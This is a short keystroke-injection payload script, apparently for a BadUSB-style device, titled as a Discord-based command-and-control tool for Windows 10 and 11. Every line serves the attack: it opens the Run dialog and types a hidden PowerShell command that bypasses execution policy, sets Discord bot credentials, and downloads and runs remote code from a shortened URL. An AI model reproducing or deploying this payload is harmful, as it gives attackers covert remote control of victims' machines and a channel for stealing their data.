// Title: beigeworm's Discord Command And Control.
// Author: @beigeworm
// Description: Using a Discord Server Chat and a github text file to Act as a Command and Control Platform.
// Target: Windows 10 and 11

// MORE INFO - https://github.com/beigeworm/PoshCord-C2

// script setup
layout("us")

// Open Powershell
delay(1000);
press("GUI r");
delay(1000);
type("powershell -NoP -Ep Bypass -W H -C $ch = 'CHANNEL_ID'; $tk = 'BOT_TOKEN'; $dc = 'WEBHOOK_URL' ; irm https://is.gd/bwdcc2 | iex");
press("ENTER");
